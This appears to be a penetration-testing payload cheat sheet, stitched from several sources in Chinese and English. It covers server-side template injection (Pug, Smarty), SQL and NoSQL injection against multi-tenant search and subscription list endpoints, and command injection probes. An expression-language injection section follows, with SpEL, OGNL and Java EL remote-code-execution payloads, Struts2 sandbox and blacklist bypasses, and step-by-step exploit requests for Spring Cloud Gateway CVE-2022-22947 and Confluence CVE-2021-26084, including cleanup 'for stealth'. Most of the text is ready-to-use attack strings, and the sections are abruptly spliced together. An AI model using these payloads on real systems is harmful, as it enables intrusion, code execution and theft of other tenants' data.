#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

// === 更短 ===
#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

---

## 7. Smarty (PHP)

```php
// === 已废弃的 {php} 标签 ===
{php}echo shell_exec('id');{/php}

// === Smarty 3+ self 变量 ===
{self::getStreamVariable("file:///etc/passwd")}

// === Smarty 3.1.31+ (沙箱绕过) ===
{system('cat /etc/passwd')}
```

---
## 相关参考
- 模板注入 RCE 后渗透 → `../post/linux-privesc.md` / `../post/windows-privesc.md`
- WAF 绕过 Payload 编码 → `waf-bypass.md`

*参考: PayloadAllTheThings SSTI + HackTricks SSTI + PortSwigger SSTI*


---

## 补充与进阶

## 注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）

---

## SQL 注入

---

### 列表筛选项 OR + total（ES / 搜索列表）

企业流水、消费、员工名单这类列表，筛的是 `employeeName` / 姓名 / 关键字，回包带 `total` / `totalNum` / `totalSize`，后端经常是 ES 或「能跑一段 SQL 的搜索」。

**这枪很险。** `or (1)=(1)` 在流水/ES 上等于「去掉租户和日期，把全库匹配一遍」。回包 total 上亿是常态，一次查询就能打满集群、拖垮列表、把别的企业流水打到你屏幕上。证明用 **total 数字差分 + 第一条能看出不是自己的** 就停。

1. 先填不存在的串，应空或几条。  
2. 再布尔假：`')and (1)=(2)--` 仍应空（证明能改逻辑，还没放开全库）。  
3. 最后才恒真：`1')or (1)=(1)--+A`（`1=1` 被拦改 `(1)=(1)`）。**只打一枪。** 只看 total，pageSize 保持 1～5。  
4. 空/个位 → 十万、百万、上亿，且第一条是**别的员工/别的企业**流水，才算成。证明到此结束。  
5. **只约束本枪（OR 恒真打 ES/流水全库）：** 同一 payload 不连打/重放，pageSize 不拉满，不点下一页/导出，本枪不用 sqlmap `--dump` / `--risk=3`，不打到删除/更新口。打挂集群不算证明。  
6. 模糊搜索把 `or` 当关键字、或涨出来全是本企业本职可读 → 假点，不报。ES 只吃 Query DSL、这段 SQL 当普通字符串 → 换 DSL/`$where`，别死磕。

这是开场，不是只准打这一条，也**不是**禁止所有注入抽数。UNION / 延时 / 报错 / WAF 编码 / 其它注入口现场按栈自己变；延时比 OR 恒真更安全时优先延时。

---

### 邮件订阅 iframe 同目录 list（手法索引有指针）

认：邮件订阅嵌在 iframe 里；同目录 list 的 `key` 当鉴权、拼进 SQL。常见皮是 订阅表单皮 / `alertform.../main/index.php?id=租户`。

打（不登录）：

1. 从 iframe 抄租户 id  
2. 打同目录 `GET /main/list.php?key=`  
3. `key` 被拼进 SQL 当鉴权。`1' OR client_id=租户 LIMIT 1#`（只要这一枪）

算成：回包是该租户订户姓名/邮箱/电话。Wrong Key / 空数组是对照。

假点：没有 list.php；key 走常量比较或预编译。单站没中不删手法索引这行。不要对全站同皮客户开 FOFA。

---

### 快速检测

单引号 / 布尔假真 / 延时。405 后换 query / json / header / path。本枪 OR+total **不用** sqlmap `--dump` / `--os-shell`。

---

### JSON / Mongo 操作符（按栈，不是每个 path 喷引号）

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`。登录框不当业务参。出他主体或稳定差分才算。

---

## 命令注入

常见口：filename / ip / ping / 转换 / 诊断页。探针 `;id` / `|id` / `$(id)` / 延时 `sleep 5`。证伪即可，不要本机反弹 shell 当教材。

---

## SSTI（服务端模板注入）

---

### 检测 Payload

```
{{7*7}}          → 如果返回 49，存在 SSTI
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

---

### 常见框架利用

```python

---

# expression-language-injection

---

# Expression Language Injection

---

## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

---

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

---

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

---

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

---

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

---

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

---

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

---

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```bash

---

## Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

---

## Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

---

## Step 3: Trigger the route
GET /hackpath

---

## Response header "Result" contains command output

---

## Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

---

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

---

## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

---

### Where OGNL Appears

- Apache Struts2 — primary OGNL consumer
- Confluence Server — uses OGNL in certain request paths
- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`

---

### Basic RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

---

### Struts2 Sandbox Bypass — _memberAccess Manipulation

Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

---

### Struts2 OgnlUtil Blacklist Clear

Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

---

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

---

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027

---

## URL-decoded: \u0027+{3*3}+\u0027

---

## If response contains 9 → confirmed

---

## Escalate to Runtime.exec for RCE
```

---

---

## 4. JAVA EL (JSP / JSF)

---

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

---

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

---

## 5. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

---

## 6. QUICK REFERENCE

```text

---

## SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

---

## OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

---

## OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

---

## Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

---

## Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

---

## Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```